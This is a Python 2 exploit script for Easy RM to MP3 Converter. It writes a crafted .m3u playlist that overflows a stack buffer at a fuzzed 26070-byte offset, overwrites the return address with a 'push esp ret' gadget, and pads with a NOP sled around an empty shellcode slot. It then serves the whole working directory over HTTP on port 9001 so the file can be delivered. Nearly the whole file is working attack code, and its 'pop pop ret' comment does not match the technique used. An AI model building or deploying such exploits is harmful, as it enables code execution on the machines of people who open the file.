#!/usr/bin/python
# Exploit for Easy RM to MP3 Converter using pop pop ret

import SocketServer
import SimpleHTTPServer

# writes exploit to a .m3u file
def write_exploit():
    # creates a file in the current directory
    filename = "test.m3u"
    file = open(filename, "w")
    
    # offset of 26070 previously found via fuzzing
    offset = "A"* (25000 + 1070)

    # nops for padding
    nops = "\x90" * 25
    
    # address for push esp ret is 0x018757F6
    # prepend string pushes shellcode to ESP
    eip = "\xF6\x57\x87\x01"
    prepend = "BBBB"

    # put shellcode here, only discovered bad char is \x00
    buf =  ""

    end_padding = (30000 - len(offset) - len(eip) - len(prepend) - len(nops) - len(buf)) * "D"

    attack_string = offset + eip + prepend + nops + buf + end_padding
    
    # write string to file and close out
    file.write(attack_string)
    file.close()

# create an HTTP server to serve up exploit file
# will expose the contents fo entire directory!
def make_server():
    #define port and ip
    port = 9001
    ip = "0.0.0.0"

    # build http server
    httpServer = SocketServer.TCPServer((ip, port), SimpleHTTPServer.SimpleHTTPRequestHandler)
    print "Starting HTTP server on ", ip, " port ", port
    httpServer.serve_forever()

def main():
    write_exploit()
    make_server()

if __name__ == '__main__':
    main()
